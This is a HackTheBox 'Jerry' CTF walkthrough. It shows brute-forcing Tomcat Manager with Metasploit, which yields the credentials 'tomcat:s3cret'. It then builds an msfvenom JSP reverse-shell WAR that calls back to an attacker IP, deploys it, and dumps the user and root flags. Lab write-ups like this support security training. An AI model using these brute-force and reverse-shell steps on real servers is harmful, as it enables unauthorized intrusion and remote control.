---
title: Jerry
date: 2025-05-21
description: Walkthrough of the "Jerry" machine on HackTheBox. It involves brute-forcing Tomcat Manager credentials, deploying a WAR reverse shell, and retrieving both user and root flags from a Windows system.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - htb-jerry
  - ctf
  - tomcat
  - bruteforce
  - war-file
  - reverse-shell
  - metasploit
  - windows
  - privilege-escalation
categories:
  - HackTheBox
  - HackTheBox/Windows
image: images/Jerry/banner.jpeg
---

# Jerry

| Title       | [Jerry](https://app.hackthebox.com/machines/144)                                                                                                                                                      |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Description | Walkthrough of the "Jerry" machine on HackTheBox. It involves brute-forcing Tomcat Manager credentials, deploying a WAR reverse shell, and retrieving both user and root flags from a Windows system. |
| Difficulty  | Easy                                                                                                                                                                                                  |
| Maker       | [mrh4sh](https://app.hackthebox.com/users/2570)                                                                                                                                                       |

## Enumeration

### Nmap

```bash
└─$ cat nmap/tcp_default.nmap
# Nmap 7.95 scan initiated Wed May 21 17:52:06 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.10.95
Nmap scan report for jerry.htb (10.10.10.95)
Host is up (0.10s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
```

I have tried several CVEs for Tomcat/7.0.88 but none of them worked. Next, we will try to bruteforce Manager App in tomcat.
![[Pasted image 20250521183225.png]]
In order to brute force, we will use metasploit (`scanner/http/tomcat_mgr_login`)
![[Pasted image 20250521183557.png]]
We got `tomcat:s3cret`!

## Flags

From this credentials, we got the dashboard.
![[Pasted image 20250521183918.png]]
It's a very well known vulnerability. In this vulnerability we will make a reverse shell using msfvenom and choose war as file extension

- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f war > backup.war`
  Now, upload the `war file to deploy` and start a Netcat listener and click on `/backup` to execute the shell.
  ![[Pasted image 20250521185511.png]]
  We will get our flags in `flags/` folder located in Administrator's Desktop.

```cmd
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,470,336 bytes free

C:\Users\Administrator\Desktop\flags>type *
type *
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
